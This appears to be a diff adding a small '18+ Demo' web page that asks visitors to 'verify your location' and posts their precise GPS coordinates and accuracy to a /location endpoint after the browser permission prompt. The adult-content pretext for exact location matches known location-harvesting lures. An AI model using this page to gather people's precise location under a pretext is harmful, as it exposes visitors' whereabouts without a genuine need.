@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>18+ Demo</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    background-image: url("/static/faf.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+
+    color: white;
+    font-family: Arial, sans-serif;
+}
+
+        .card {
+            width: 90%;
+            max-width: 430px;
+            padding: 35px 30px;
+            text-align: center;
+            background: #181818;
+            border-radius: 18px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.7);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 6px 12px;
+            background: #333;
+            border-radius: 20px;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            margin: 5px 0 12px;
+            font-size: 30px;
+        }
+
+        p {
+            color: #bdbdbd;
+            line-height: 1.6;
+        }
+
+        button {
+            width: 100%;
+            margin-top: 18px;
+            padding: 15px;
+            border: none;
+            border-radius: 9px;
+            background: #e91e63;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <div class="badge">18+ DEMO</div>
+
+    <h1>Location Verification</h1>
+
+    <p>
+        Please verify your location to continue.
+        Your browser will ask for permission before
+        sharing your location.
+    </p>
+
+    <button onclick="getLocation()">
+        Continue
+    </button>
+
+    <p id="status"></p>
+
+</div>
+
+<script>
+
+function getLocation() {
+
+    const status = document.getElementById("status");
+
+    if (!navigator.geolocation) {
+        status.textContent =
+            "Location services are not supported by your browser.";
+        return;
+    }
+
+    status.textContent =
+        "Requesting location permission...";
+
+    navigator.geolocation.getCurrentPosition(
+
+        async function(position) {
+
+            const latitude =
+                position.coords.latitude;
+
+            const longitude =
+                position.coords.longitude;
+
+            const accuracy =
+                position.coords.accuracy;
+
+            try {
+
+                const response = await fetch("/location", {
+
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy
+                    })
+                });
+
+                const result = await response.json();
+
+                status.textContent =
+                    result.message;
+
+            } catch (error) {
+
+                status.textContent =
+                    "Could not send location.";
+            }
+        },
+
+        function(error) {
+
+            status.textContent =
+                "Location permission was not granted.";
+        }
+    );
+}
+
+</script>
+
+</body>
+</html>
